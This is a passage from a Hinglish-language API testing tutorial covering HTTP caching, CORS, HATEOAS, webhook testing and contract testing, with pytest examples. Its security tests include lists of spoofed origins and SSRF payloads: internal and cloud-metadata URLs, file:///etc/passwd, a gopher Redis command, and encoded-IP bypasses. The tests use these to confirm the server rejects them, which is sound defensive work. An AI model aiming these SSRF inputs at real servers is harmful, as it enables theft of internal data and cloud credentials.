- `no-store` = "cache karo hi mat" (sensitive data)

Naam confusing hai — `no-cache` actually caching allow karta hai.

### ETag flow

```
Pehli request:
  GET /api/v1/sales/s_1024
  -> 200 OK
     ETag: "a3f9c21e"
     Content-Length: 2048
     {full body}

Doosri request (client ke paas cached copy hai):
  GET /api/v1/sales/s_1024
  If-None-Match: "a3f9c21e"

  Data nahi badla:
  -> 304 Not Modified
     ETag: "a3f9c21e"
     (NO BODY — bandwidth bachi)

  Data badal gaya:
  -> 200 OK
     ETag: "b7e1d449"
     {new full body}
```

**Strong vs Weak ETags:**
- Strong: `ETag: "a3f9c21e"` — byte-for-byte identical
- Weak: `ETag: W/"a3f9c21e"` — semantically equivalent (gzip vs uncompressed same maana jayega)

```python
class TestCaching:

    def test_etag_and_conditional_get(self, api, sale_id):
        r1 = api.get(f"/api/v1/sales/{sale_id}")
        etag = r1.headers.get("ETag")
        if not etag:
            pytest.skip("ETag support nahi — ye khud ek finding hai")

        r2 = api.get(f"/api/v1/sales/{sale_id}", headers={"If-None-Match": etag})
        assert r2.status_code == 304, f"Unchanged resource pe {r2.status_code}"
        assert r2.content == b"", "304 ke saath body aaya — spec violation, bandwidth waste"
        assert r2.headers.get("ETag") == etag

    def test_etag_changes_when_resource_changes(self, api, sale_id):
        """ETag content ka fingerprint hona chahiye. Agar update ke baad
        same ETag rehta hai, clients STALE data cache karte rahenge —
        aur ye ek serious data-freshness bug hai."""
        etag_before = api.get(f"/api/v1/sales/{sale_id}").headers["ETag"]
        api.patch(f"/api/v1/sales/{sale_id}", json={"notes": f"changed-{uuid.uuid4().hex[:6]}"})
        etag_after = api.get(f"/api/v1/sales/{sale_id}").headers["ETag"]

        assert etag_before != etag_after, (
            "Resource badla lekin ETag wahi hai — clients stale data serve karenge"
        )

    @pytest.mark.security
    def test_etag_is_not_a_user_tracking_vector(self, api, api_other_user, sale_id):
        """Subtle: agar ETag mein user id embed hai, wo ek supercookie ban jaata hai.
        Do users ka same content ka ETag same hona chahiye."""
        e1 = api.get(f"/api/v1/sales/{sale_id}").headers.get("ETag", "")
        e2 = api_other_user.get(f"/api/v1/sales/{sale_id}").headers.get("ETag", "")
        if e1 and e2:
            assert e1 == e2, "Same content pe alag ETag — user-specific tracking vector"

    @pytest.mark.security
    def test_authenticated_responses_have_vary_authorization(self, api, sale_id):
        """SABSE IMPORTANT caching security test.
        Agar response cacheable hai aur 'Vary: Authorization' nahi hai,
        shared cache User A ka response User B ko serve kar sakta hai.
        Ye ek real, catastrophic data leak hai."""
        r = api.get(f"/api/v1/sales/{sale_id}")
        cc = r.headers.get("Cache-Control", "").lower()

        if "no-store" in cc or "private" in cc:
            return   # safe

        vary = r.headers.get("Vary", "").lower()
        assert "authorization" in vary or "cookie" in vary, (
            f"Response cacheable hai (Cache-Control: {cc}) lekin Vary header "
            f"'{vary}' mein Authorization nahi hai. Shared CDN/proxy "
            "ek user ka data doosre ko serve kar sakta hai."
        )

    def test_static_and_dynamic_have_different_cache_policies(self, api):
        """Reference data cacheable honi chahiye, user data nahi."""
        ref = api.get("/api/v1/reference/currencies")
        assert "max-age" in ref.headers.get("Cache-Control", ""), \
            "Reference data cacheable nahi hai — har request DB tak ja rahi hai"

        user_data = api.get("/api/v1/sales/s_1")
        cc = user_data.headers.get("Cache-Control", "").lower()
        assert "no-store" in cc or "private" in cc
```

## 8.7 CORS

### Kya hai

**Same-Origin Policy** browser ka fundamental security rule hai: `https://app.merlinai.co`
ka JavaScript `https://api.merlinai.co` se response **padh nahi sakta** — kyunki wo alag
origin hai.

Origin = **scheme + host + port**. Teeno match hone chahiye.

```
https://app.merlinai.co         vs
https://api.merlinai.co         -> ALAG (host)
http://app.merlinai.co          -> ALAG (scheme)
https://app.merlinai.co:8443    -> ALAG (port)
```

**CORS** (Cross-Origin Resource Sharing) is rule ko **controlled tarike se relax** karta hai —
server headers ke through batata hai ki kaunse origins allowed hain.

**Critical understanding:** CORS server ko protect nahi karta. **CORS browser ko protect
karta hai** — matlab wo users ko malicious websites se bachata hai. curl, Postman, Python
requests — inme CORS lagta hi nahi, kyunki wo browsers nahi hain.

### Simple request vs Preflight

**Simple request** — browser directly bhej deta hai, preflight nahi:
- Method: `GET`, `HEAD`, ya `POST`
- Content-Type: sirf `text/plain`, `multipart/form-data`, ya `application/x-www-form-urlencoded`
- Koi custom headers nahi

**Preflighted request** — browser pehle `OPTIONS` bhejta hai:
- Koi bhi doosra method (`PUT`, `PATCH`, `DELETE`)
- `Content-Type: application/json`  ← **isliye har JSON API preflight karti hai**
- Custom headers jaise `Authorization`, `X-Request-Id`

```
Preflight flow:

  Browser                                          Server
     |                                                |
     |  OPTIONS /api/v1/budgets/b_1/carve             |
     |  Origin: https://app.merlinai.co               |
     |  Access-Control-Request-Method: POST           |
     |  Access-Control-Request-Headers: authorization,content-type
     |  (NO Authorization header! NO cookies!)        |
     |----------------------------------------------->|
     |                                                |
     |  204 No Content                                |
     |  Access-Control-Allow-Origin: https://app.merlinai.co
     |  Access-Control-Allow-Methods: GET,POST,PATCH,DELETE
     |  Access-Control-Allow-Headers: authorization,content-type
     |  Access-Control-Allow-Credentials: true        |
     |  Access-Control-Max-Age: 600                   |
     |<-----------------------------------------------|
     |                                                |
     |  [browser checks: origin allowed? method allowed? headers allowed?]
     |  [agar koi bhi NAHI -> request bhejta hi nahi, console mein CORS error]
     |                                                |
     |  POST /api/v1/budgets/b_1/carve                |
     |  Origin: https://app.merlinai.co               |
     |  Authorization: Bearer eyJ...                  |
     |  Content-Type: application/json                |
     |----------------------------------------------->|
     |                                                |
     |  201 Created                                   |
     |  Access-Control-Allow-Origin: https://app.merlinai.co
     |<-----------------------------------------------|
```

**Sabse important detail:** preflight `OPTIONS` request mein **Authorization header nahi
jaata**. Isliye `OPTIONS` par auth lagana = poori CORS toot jaati hai. Aur ye bug curl/Postman
se kabhi nahi dikhta.

```python
class TestCORS:

    def test_preflight_succeeds_without_auth(self):
        """[SABSE IMPORTANT CORS TEST]
        Browser preflight pe credentials nahi bhejta.
        Agar OPTIONS pe 401 aaya, saari browser calls fail hongi —
        aur ye bug Postman se kabhi nahi dikhega."""
        r = requests.options(f"{BASE_URL}/api/v1/budgets/b_1/carve", headers={
            "Origin": "https://app.merlinai.co",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "authorization,content-type",
        }, timeout=30)

        assert r.status_code in (200, 204), (
            f"Preflight pe {r.status_code} — browser se koi cross-origin call nahi chalegi"
        )
        assert r.headers.get("Access-Control-Allow-Origin") == "https://app.merlinai.co"
        assert "POST" in r.headers.get("Access-Control-Allow-Methods", "")
        allowed_headers = r.headers.get("Access-Control-Allow-Headers", "").lower()
        assert "authorization" in allowed_headers, "Authorization header allowed nahi hai"
        assert "content-type" in allowed_headers

    @pytest.mark.security
    def test_wildcard_origin_not_used_with_credentials(self):
        """Spec violation aur security hole:
        Access-Control-Allow-Origin: * ke saath Allow-Credentials: true
        combination browsers reject karte hain — lekin agar server ye bhejta hai,
        wo signal hai ki CORS config sochi-samjhi nahi hai."""
        r = requests.options(f"{BASE_URL}/api/v1/sales/s_1", headers={
            "Origin": "https://evil.example.com",
            "Access-Control-Request-Method": "GET",
        }, timeout=30)

        aco = r.headers.get("Access-Control-Allow-Origin")
        acc = r.headers.get("Access-Control-Allow-Credentials")
        assert not (aco == "*" and acc == "true"), \
            "Wildcard origin + credentials — invalid aur dangerous config"

    @pytest.mark.security
    @pytest.mark.parametrize("evil_origin", [
        "https://evil.example.com",
        "https://app.merlinai.co.evil.com",       # suffix attack
        "https://evilapp.merlinai.co",             # prefix attack
        "http://app.merlinai.co",                  # scheme downgrade
        "null",                                    # sandboxed iframe / file://
        "https://app.merlinai.co:1337",            # port change
    ])
    def test_untrusted_origins_are_rejected(self, evil_origin):
        """Origin validation EXACT match honi chahiye — startswith/contains NAHI.
        'https://app.merlinai.co.evil.com'.startswith('https://app.merlinai.co') == True
        Ye ek real, commonly-shipped bug hai."""
        r = requests.options(f"{BASE_URL}/api/v1/sales/s_1", headers={
            "Origin": evil_origin,
            "Access-Control-Request-Method": "GET",
        }, timeout=30)

        aco = r.headers.get("Access-Control-Allow-Origin")
        assert aco != evil_origin, (
            f"Server ne untrusted origin '{evil_origin}' reflect kar diya — "
            "attacker ki site logged-in user ka data padh sakti hai"
        )
        assert aco != "*" or r.headers.get("Access-Control-Allow-Credentials") != "true"

    @pytest.mark.security
    def test_origin_is_not_blindly_reflected(self):
        """Sabse common CORS bug: server jo bhi Origin aata hai wahi reflect kar deta hai.
        Ye effectively CORS ko disable kar deta hai."""
        random_origin = f"https://{uuid.uuid4().hex}.example.com"
        r = requests.options(f"{BASE_URL}/api/v1/sales/s_1", headers={
            "Origin": random_origin, "Access-Control-Request-Method": "GET"}, timeout=30)
        assert r.headers.get("Access-Control-Allow-Origin") != random_origin, (
            "Server har Origin ko reflect kar raha hai — CORS protection zero hai"
        )

    def test_preflight_is_cached(self):
        """Access-Control-Max-Age na hone se har request se pehle
        ek extra OPTIONS round trip jaata hai — 2x latency."""
        r = requests.options(f"{BASE_URL}/api/v1/budgets/b_1/carve", headers={
            "Origin": "https://app.merlinai.co",
            "Access-Control-Request-Method": "POST"}, timeout=30)
        max_age = r.headers.get("Access-Control-Max-Age")
        assert max_age and int(max_age) > 0, (
            "Access-Control-Max-Age nahi hai — har API call se pehle "
            "ek extra preflight round trip, 2x latency"
        )

    def test_custom_response_headers_are_exposed(self, api, sale_id):
        """Browser JS default mein sirf 6 'simple' response headers padh sakta hai.
        X-Request-Id, X-RateLimit-* padhne ke liye
        Access-Control-Expose-Headers chahiye."""
        r = api.get(f"/api/v1/sales/{sale_id}", headers={"Origin": "https://app.merlinai.co"})
        exposed = r.headers.get("Access-Control-Expose-Headers", "").lower()
        if "X-Request-Id" in r.headers:
            assert "x-request-id" in exposed, (
                "X-Request-Id bheja ja raha hai lekin expose nahi kiya — "
                "frontend error reporting mein correlation id nahi daal payega"
            )
```

## 8.8 HATEOAS

### Kya hai

Response mein **links** hote hain jo batate hain ki ab client kya kar sakta hai. Client URLs
construct nahi karta — discover karta hai.

```json
{
  "id": "s_1024",
  "status": "OPEN",
  "totalPrice": 4500000,
  "_links": {
    "self":   {"href": "/api/v1/sales/s_1024", "method": "GET"},
    "spine":  {"href": "/api/v1/sales/s_1024/spine", "method": "GET"},
    "close":  {"href": "/api/v1/sales/s_1024/close", "method": "POST"},
    "cancel": {"href": "/api/v1/sales/s_1024/cancel", "method": "POST"}
  }
}
```

Jab sale CLOSED ho jaati hai:
```json
{
  "id": "s_1024",
  "status": "CLOSED",
  "_links": {
    "self":  {"href": "/api/v1/sales/s_1024", "method": "GET"},
    "spine": {"href": "/api/v1/sales/s_1024/spine", "method": "GET"}
  }
}
```
`close` aur `cancel` links **gayab** ho gaye — client ko pata chal gaya ki ab wo actions
possible nahi hain, bina business rules jaane.

### QA perspective — links state machine ka mirror hain

```python
class TestHateoas:

    @pytest.mark.parametrize("status,expected_links", [
        ("DRAFT",     {"self", "spine", "open", "delete"}),
        ("OPEN",      {"self", "spine", "close", "cancel"}),
        ("CLOSED",    {"self", "spine"}),
        ("CANCELLED", {"self", "spine"}),
    ])
    def test_links_reflect_state(self, api, sale_in_state, status, expected_links):
        """Links state machine ka projection hain."""
        sale_id = sale_in_state(status)
        body = api.get(f"/api/v1/sales/{sale_id}").json()
        links = set(body.get("_links", {}))
        assert links == expected_links, (
            f"status={status}: links {links}, expected {expected_links}"
        )

    def test_absent_link_action_is_actually_forbidden(self, api, sale_in_state):
        """SABSE IMPORTANT HATEOAS TEST:
        agar 'close' link nahi hai, to POST /close SACH MEIN reject hona chahiye.
        Warna links jhooth bol rahe hain — aur ek security-through-obscurity
        situation ban jaati hai jahan action hidden hai lekin blocked nahi."""
        sale_id = sale_in_state("CLOSED")
        body = api.get(f"/api/v1/sales/{sale_id}").json()
        assert "close" not in body.get("_links", {})

        r = api.post(f"/api/v1/sales/{sale_id}/close")
        assert r.status_code in (403, 409, 422), (
            f"'close' link hidden tha lekin action {r.status_code} ke saath chal gaya — "
            "links UI ko guide kar rahe hain, security enforce nahi kar rahe"
        )

    def test_all_links_are_reachable(self, api, sale_id):
        """Har advertised link actually kaam karna chahiye — dead links nahi."""
        body = api.get(f"/api/v1/sales/{sale_id}").json()
        for rel, link in body.get("_links", {}).items():
            if link.get("method", "GET") != "GET":
                continue
            r = api.get(link["href"])
            assert r.status_code == 200, f"Link '{rel}' -> {link['href']} gave {r.status_code}"

    @pytest.mark.security
    def test_links_respect_authorization(self, api_viewer, sale_id):
        """VIEWER ko 'close' link nahi dikhna chahiye — kyunki wo close nahi kar sakta."""
        body = api_viewer.get(f"/api/v1/sales/{sale_id}").json()
        assert "close" not in body.get("_links", {}), (
            "VIEWER ko 'close' link dikh raha hai jo wo perform nahi kar sakta"
        )
```

## 8.9 Webhooks

### Kya hai

Reverse API. Aap poll nahi karte — jab event hota hai, **provider aapko call karta hai**.

```
Polling (bura):                      Webhook (achha):
  Client: "kuch hua?"  -> nahi         Server: [event hota hai]
  Client: "kuch hua?"  -> nahi         Server -> POST https://client/webhook
  Client: "kuch hua?"  -> nahi         Client: 200 OK
  Client: "kuch hua?"  -> HAAN
  (99% requests waste)
```

### Webhook testing ki chunauti

Aapko ek **HTTP server** chahiye jo requests receive kare. Ye normal API testing se ulta hai.

### Approach 1 — local receiver in pytest

```python
# tests/webhook_receiver.py
import threading, json, queue
from http.server import BaseHTTPRequestHandler, HTTPServer


class WebhookReceiver:
    """Test ke andar ek chhota HTTP server jo webhooks catch karta hai.
    Ye sabse controlled approach hai — koi external dependency nahi."""

    def __init__(self, port=0, respond_status=200, delay=0.0):
        self.received = queue.Queue()
        self.respond_status = respond_status
        self.delay = delay
        self._make_server(port)

    def _make_server(self, port):
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(length)
                outer.received.put({
                    "headers": dict(self.headers),
                    "raw_body": raw,
                    "body": json.loads(raw) if raw else None,
                    "path": self.path,
                    "received_at": time.time(),
                })
                if outer.delay:
                    time.sleep(outer.delay)
                self.send_response(outer.respond_status)
                self.end_headers()
                self.wfile.write(b'{"ok":true}')

            def log_message(self, *args):
                pass      # pytest output clean rakho

        self.server = HTTPServer(("0.0.0.0", port), Handler)
        self.port = self.server.server_port

    def start(self):
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        return self

    def stop(self):
        self.server.shutdown()

    @property
    def url(self):
        # NOTE: provider ko ye URL reachable hona chahiye.
        # Local dev mein ngrok/localtunnel chahiye, CI mein service container.
        return f"http://{PUBLIC_TEST_HOST}:{self.port}/webhook"

    def wait_for(self, timeout=30, predicate=None):
        """Ek matching webhook ka wait karo."""
        deadline = time.time() + timeout
        buffered = []
        while time.time() < deadline:
            try:
                item = self.received.get(timeout=max(0.1, deadline - time.time()))
            except queue.Empty:
                break
            if predicate is None or predicate(item):
                for b in buffered:
                    self.received.put(b)
                return item
            buffered.append(item)
        for b in buffered:
            self.received.put(b)
        raise AssertionError(f"Koi matching webhook {timeout}s mein nahi aaya")

    def count(self):
        return self.received.qsize()


@pytest.fixture
def webhook_receiver():
    rx = WebhookReceiver().start()
    yield rx
    rx.stop()
```

### Test 1 — delivery

```python
def test_webhook_delivered_on_sale_close(api, webhook_receiver, sale_id):
    api.post("/api/v1/webhooks", json={
        "url": webhook_receiver.url,
        "events": ["sale.closed"],
        "secret": "whsec_test_12345",
    })

    api.post(f"/api/v1/sales/{sale_id}/close")

    hook = webhook_receiver.wait_for(
        timeout=30,
        predicate=lambda h: h["body"]["type"] == "sale.closed"
    )

    assert hook["body"]["data"]["saleId"] == sale_id
    assert hook["body"]["data"]["status"] == "CLOSED"
    assert "id" in hook["body"], "Event ka apna id nahi — idempotency impossible"
    assert "createdAt" in hook["body"]
```

### Test 2 — signature verification (SABSE IMPORTANT)

```python
import hmac, hashlib

def compute_signature(secret: str, timestamp: str, raw_body: bytes) -> str:
    """Stripe-style signature. Timestamp SIGNED PAYLOAD ka part hai —
    isse replay attacks rukte hain."""
    signed_payload = f"{timestamp}.".encode() + raw_body
    return hmac.new(secret.encode(), signed_payload, hashlib.sha256).hexdigest()


def test_webhook_signature_is_valid(api, webhook_receiver, sale_id):
    """[SABSE IMPORTANT WEBHOOK TEST]
    Webhook endpoint PUBLIC hota hai — koi bhi POST kar sakta hai.
    Isliye signature hi ekmatra proof hai ki event genuine hai.
    Bina signature verification ke, koi bhi fake 'payment.succeeded' bhej sakta hai."""
    secret = "whsec_test_12345"
    api.post("/api/v1/webhooks", json={"url": webhook_receiver.url,
                                       "events": ["sale.closed"], "secret": secret})
    api.post(f"/api/v1/sales/{sale_id}/close")

    hook = webhook_receiver.wait_for()

    sig_header = hook["headers"].get("X-Merlin-Signature") or \
                 hook["headers"].get("X-Signature")
    assert sig_header, "Webhook bina signature ke aaya — koi bhi fake event bhej sakta hai"

    parts = dict(p.split("=", 1) for p in sig_header.split(","))
    timestamp, received_sig = parts["t"], parts["v1"]

    expected = compute_signature(secret, timestamp, hook["raw_body"])
    assert hmac.compare_digest(expected, received_sig), (
        f"Signature mismatch.\nExpected: {expected}\nReceived: {received_sig}"
    )

    # Timestamp recent hona chahiye — replay window bounded
    age = time.time() - int(timestamp)
    assert abs(age) < 300, f"Timestamp {age:.0f}s purana — replay window bahut bada"


def test_signature_is_computed_over_raw_body(api, webhook_receiver, sale_id):
    """CRITICAL implementation detail jo receivers galat karte hain:
    signature RAW BYTES pe compute honi chahiye, parsed-then-reserialized JSON pe nahi.
    Kyunki JSON reserialize karne pe key order aur whitespace badal sakta hai
    aur signature mismatch ho jaata hai — ya worse, attacker
    semantically-different payload bana sakta hai jo same reserialize hota hai."""
    hook = trigger_and_wait(api, webhook_receiver, sale_id)
    reserialized = json.dumps(hook["body"]).encode()
    assert reserialized != hook["raw_body"] or True   # informational
    # Assert: hamesha raw_body use karo, kabhi json.dumps(parsed) nahi
```

### Test 3 — replay attack

```python
@pytest.mark.security
def test_receiver_rejects_replayed_webhook(webhook_receiver_app):
    """Aapka receiver (jo aapki team likhti hai) purane events reject kare.
    Attacker ek valid webhook capture karke baar-baar bhej sakta hai."""
    secret = "whsec_test_12345"
    body = json.dumps({"id": "evt_1", "type": "sale.closed",
                       "data": {"saleId": "s_1"}}).encode()

    old_ts = str(int(time.time()) - 3600)     # 1 hour purana
    sig = compute_signature(secret, old_ts, body)

    r = requests.post(RECEIVER_URL, data=body, headers={
        "Content-Type": "application/json",
        "X-Merlin-Signature": f"t={old_ts},v1={sig}",
    }, timeout=30)

    assert r.status_code in (400, 401, 403), (
        f"1 ghante purana webhook accept ho gaya ({r.status_code}) — "
        "replay attack possible. Timestamp tolerance check missing."
    )
```

### Test 4 — idempotency (out-of-order aur duplicate)

```python
def test_receiver_is_idempotent_on_duplicate_event(webhook_receiver_app, db):
    """Webhook providers AT-LEAST-ONCE deliver karte hain, exactly-once NAHI.
    Matlab duplicate delivery NORMAL hai — network timeout,
    receiver ka slow response, provider ka retry.

    Receiver ko event id se dedupe karna chahiye."""
    event = {"id": "evt_duplicate_test", "type": "payment.succeeded",
             "data": {"saleId": "s_1", "amount": 100000}}
    body = json.dumps(event).encode()
    headers = signed_headers(body)

    r1 = requests.post(RECEIVER_URL, data=body, headers=headers, timeout=30)
    r2 = requests.post(RECEIVER_URL, data=body, headers=headers, timeout=30)

    assert r1.status_code == 200 and r2.status_code == 200, (
        "Duplicate pe error dena bhi galat hai — provider retry karta rahega"
    )

    payments = db.query("SELECT * FROM payments WHERE sale_id = 's_1'")
    assert len(payments) == 1, (
        f"Duplicate webhook se {len(payments)} payments record hue — "
        "receiver event id se dedupe nahi kar raha"
    )


def test_receiver_handles_out_of_order_events(webhook_receiver_app, db):
    """Webhooks ORDER GUARANTEE nahi dete. 'sale.closed' 'sale.opened' se
    PEHLE aa sakta hai — kyunki wo alag connections pe, alag latency ke saath jaate hain.

    Receiver ko timestamp/sequence dekh ke stale events discard karne chahiye."""
    opened = {"id": "evt_1", "type": "sale.opened", "sequence": 1,
              "createdAt": "2026-08-23T10:00:00Z", "data": {"saleId": "s_1"}}
    closed = {"id": "evt_2", "type": "sale.closed", "sequence": 2,
              "createdAt": "2026-08-23T10:05:00Z", "data": {"saleId": "s_1"}}

    # ULTA order mein bhejo — closed pehle
    post_signed(closed)
    post_signed(opened)

    sale = db.query_one("SELECT * FROM sales WHERE id = 's_1'")
    assert sale["status"] == "CLOSED", (
        f"Final status '{sale['status']}' — out-of-order event ne "
        "newer state ko overwrite kar diya. Receiver ko sequence/timestamp "
        "compare karke stale updates discard karne chahiye."
    )
```

### Test 5 — retry behaviour (provider side)

```python
@pytest.mark.slow
def test_provider_retries_on_receiver_failure(api, sale_id):
    """Receiver 500 deta hai. Provider ko exponential backoff se retry karna chahiye."""
    rx = WebhookReceiver(respond_status=500).start()
    try:
        api.post("/api/v1/webhooks", json={"url": rx.url, "events": ["sale.closed"],
                                           "secret": "whsec_test"})
        api.post(f"/api/v1/sales/{sale_id}/close")

        time.sleep(120)     # retry window
        attempts = rx.count()
        assert attempts >= 2, f"Sirf {attempts} attempt — retry nahi ho raha"

        # Backoff verify karo — intervals badhne chahiye
        times = sorted(rx.received.queue, key=lambda h: h["received_at"])
        gaps = [times[i+1]["received_at"] - times[i]["received_at"]
                for i in range(len(times) - 1)]
        if len(gaps) >= 2:
            assert gaps[1] > gaps[0], (
                f"Retry gaps {gaps} — exponential backoff nahi hai, "
                "fixed interval hai. Down receiver ko hammer karega."
            )
    finally:
        rx.stop()


@pytest.mark.slow
def test_provider_gives_up_and_records_failure(api, sale_id):
    """Infinite retry nahi honi chahiye. Max attempts ke baad
    event failed mark hona chahiye aur dashboard mein dikhna chahiye."""
    rx = WebhookReceiver(respond_status=500).start()
    try:
        wh = api.post("/api/v1/webhooks", json={"url": rx.url, "events": ["sale.closed"],
                                                "secret": "whsec_test"}).json()
        api.post(f"/api/v1/sales/{sale_id}/close")
        time.sleep(300)

        deliveries = api.get(f"/api/v1/webhooks/{wh['id']}/deliveries").json()["items"]
        failed = [d for d in deliveries if d["status"] == "FAILED"]
        assert failed, "Failed deliveries visible nahi hain — debugging impossible"
        assert deliveries[0]["attempts"] <= 10, "Retry cap nahi hai"
    finally:
        rx.stop()


@pytest.mark.slow
def test_slow_receiver_times_out_not_blocks(api, sale_id):
    """Receiver 60 second leta hai. Provider ko timeout karna chahiye
    (usually 5-30s) — warna ek slow receiver poori delivery queue block kar dega."""
    rx = WebhookReceiver(delay=60).start()
    try:
        api.post("/api/v1/webhooks", json={"url": rx.url, "events": ["sale.closed"],
                                           "secret": "whsec_test"})
        t0 = time.time()
        api.post(f"/api/v1/sales/{sale_id}/close")
        elapsed = time.time() - t0
        assert elapsed < 5, (
            f"Sale close mein {elapsed:.0f}s laga — webhook delivery SYNCHRONOUS hai. "
            "Ek slow receiver poori API block kar dega. Async queue chahiye."
        )
    finally:
        rx.stop()
```

### Test 6 — SSRF (webhook URL registration)

```python
@pytest.mark.security
@pytest.mark.parametrize("evil_url", [
    "http://localhost:8080/admin",
    "http://127.0.0.1:6379",                     # Redis
    "http://169.254.169.254/latest/meta-data/",  # AWS instance metadata — CLASSIC
    "http://metadata.google.internal/",
    "http://10.0.0.1/internal",
    "http://[::1]:8080/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_SET%20key%20val",
    "http://0177.0.0.1/",                        # octal IP bypass
    "http://2130706433/",                        # decimal IP bypass
])
def test_webhook_url_ssrf_protection(api, evil_url):
    """[SERIOUS] Webhook URL registration ek SSRF vector hai —
    aap server ko bol rahe ho 'is URL pe request bhejo'.
    Agar internal URLs allowed hain, attacker cloud metadata service se
    IAM credentials nikal sakta hai. Ye ek known catastrophic attack chain hai."""
    r = api.post("/api/v1/webhooks", json={"url": evil_url, "events": ["sale.closed"],
                                           "secret": "whsec_test"})
    assert r.status_code in (400, 422), (
        f"Webhook URL '{evil_url}' accept ho gaya ({r.status_code}) — SSRF vector"
    )


@pytest.mark.security
def test_webhook_url_must_be_https(api):
    """HTTP webhook = payload plaintext, signature MITM se strip ho sakti hai."""
    r = api.post("/api/v1/webhooks", json={"url": "http://example.com/hook",
                                           "events": ["sale.closed"], "secret": "s"})
    assert r.status_code in (400, 422), "HTTP webhook URL accept ho gaya"
```

### Webhook testing checklist

| # | Test | Kyun |
|---|---|---|
| 1 | Event delivered on trigger | Basic |
| 2 | Payload shape matches schema | Contract |
| 3 | Signature present and valid | Only proof of authenticity |
| 4 | Signature computed over raw bytes | Reserialize breaks it |
| 5 | Old timestamp rejected | Replay attack |
| 6 | Duplicate event → single side effect | At-least-once delivery is normal |
| 7 | Out-of-order events → correct final state | No ordering guarantee |
| 8 | Receiver 500 → provider retries with backoff | Reliability |
| 9 | Retry has a cap + visible failure record | Debuggability |
| 10 | Slow receiver doesn't block the API | Async delivery |
| 11 | Webhook URL SSRF-protected | Cloud metadata theft |
| 12 | HTTPS-only URLs | Payload confidentiality |
| 13 | Only subscribed events delivered | Data leak across subscriptions |
| 14 | Secret rotation supported | Operational |

> **Interview answer (webhooks):**
>
> "Webhooks invert the testing problem — instead of sending a request and asserting on the
> response, I have to stand up a receiver and assert on what arrives. I run a small HTTP
> server inside the test that pushes every received request onto a queue, so a test can
> trigger the business action and then wait for a webhook matching a predicate, with a
> timeout.
>
> The single most important test is signature verification, because a webhook endpoint is
> public by definition — anyone can POST to it. The signature is the only proof that the
> event actually came from the provider. Without it, anybody can send a fake
> `payment.succeeded`. And there's an implementation trap I specifically test for: the
> signature has to be computed over the raw request bytes, not over the JSON parsed and
> re-serialised, because re-serialising can reorder keys and change whitespace. I also assert
> the signed timestamp is recent, which is what bounds the replay window — and I test the
> replay directly by resending a valid, correctly-signed event with an hour-old timestamp and
> asserting it's rejected.
>
> Then two properties that people assume and shouldn't. Delivery is at-least-once, not
> exactly-once, so duplicates are normal traffic, not an incident — I send the same event
> twice and assert exactly one payment row exists, which means the receiver is deduplicating
> on event id. And there's no ordering guarantee, so I deliberately deliver a `sale.closed`
> before the `sale.opened` that logically precedes it, and assert the final state is CLOSED —
> if the receiver blindly applies whatever arrives last, an older event will overwrite newer
> state.
>
> One thing I'd raise proactively as a risk rather than wait to find: webhook URL registration
> is a server-side request forgery vector, because you're telling the server to make a request
> to a URL the user chose. I test that internal addresses are rejected — localhost, the
> private ranges, and specifically the cloud metadata address 169.254.169.254, including the
> octal and decimal encodings of it that naive blocklists miss, because that one leads
> straight to cloud credentials."

---

# PART 9 — Contract Testing

## 9.1 Kya problem solve karta hai

### Scenario — ye bilkul aapka [REAL] bug hai

```
Frontend team (Next.js):
  Unit tests likhe. Mock API se test kiya.
  Mock: { "totalPrice": 4500000, "lineItems": [...] }
  ALL TESTS PASS ✓

Backend team (Kotlin/Spring):
  57 integration tests likhe. Token forgery, replay, expiry, cross-org.
  Har test apna token mint karta hai, apna customerId pass karta hai.
  ALL TESTS PASS ✓

Production:
  End-to-end flow TOOTA HUA hai.
```

**Kyun?** Kyunki dono side apni-apni **assumptions** test kar rahe the. Frontend ne test kiya
"agar API ye shape deti hai to mera code kaam karta hai". Backend ne test kiya "agar mujhe ye
input mile to main ye output deta hoon". Kisi ne test nahi kiya ki **backend ka actual output
frontend ki actual assumption se match karta hai**.

> **[REAL]** Merlin ke 57 backend integration tests exactly ye galti kar rahe the. Har test
> apna token mint karta tha aur apna customerId pass karta tha — matlab har test apne hi
> constructed inputs ke against verify kar raha tha. Real flow mein token ek component se
> aata hai aur customerId doosre se resolve hota hai. **Wo seam kabhi test nahi hua.**
>
> Contract testing exactly is bug class ke liye bana hai.

### Test pyramid mein contract testing kahan hai

```
                    /\
                   /  \      E2E (few) — slow, flaky, but real
                  /----\
                 /      \    Integration — real DB, real services
                /--------\
               /          \  CONTRACT — do services ke BEECH ka agreement
              /------------\
             /              \ Unit — fast, isolated, mocked
            /----------------\

Contract testing integration ke neeche baithta hai kyunki:
  + Integration jitna confidence deta hai (seams pe)
  - Unit jitna fast hai (kyunki dono side alag chalte hain)
  + Dono services ko ek saath deploy karne ki zaroorat NAHI
```

## 9.2 Consumer-Driven Contracts (CDC)

### Core idea

**Consumer** (jo API use karta hai) batata hai ki usko kya chahiye. **Provider** (jo API deta
hai) verify karta hai ki wo de sakta hai.

```
Traditional (provider-driven):
  Provider: "Ye mera OpenAPI spec hai. Isse use karo."
  Consumer: [spec ke against code likhta hai]
  Problem: spec stale ho jaata hai. Provider ko pata nahi
           consumer actually kaunse fields use karta hai.
           Provider ek unused field remove karta hai — lagta hai safe hai —
           lekin actually koi consumer use kar raha tha.

Consumer-Driven:
  Consumer: "Mujhe ye chahiye: id, status, totalPrice (non-null number),
             lineItems (array of {id, description, amount})"
  -> ye ek PACT FILE ban jaati hai
  Provider: [pact file ke against apne aap ko verify karta hai]
  -> agar provider koi field hataye jo consumer use karta hai, PROVIDER KA BUILD FAIL HOTA HAI
```

**Ye sabse important property hai:** breaking change **provider ke CI mein** pakdi jaati hai,
production mein nahi.

### Kab contract testing use karo, kab nahi

| Use karo | Mat karo |
|---|---|
| Microservices, kai teams | Monolith, ek team |
| Consumer aur provider alag repos/deploy cycles | Same repo, same deploy |
| API internal hai (aap dono side control karte ho) | Third-party API (aap provider verify nahi kar sakte) |
| Breaking changes ka darr hai | API stable hai, kabhi badalti nahi |
| E2E tests slow/flaky hain | Chhota system, E2E fast hai |

**Third-party API ke liye:** contract testing nahi kar sakte (provider verify nahi karega),
lekin aap **schema snapshot tests** kar sakte ho — jo Part 6 mein describe kiya.

## 9.3 Pact — worked example

### Setup

```bash
pip install pact-python
```

### Consumer side — frontend ka test

```python
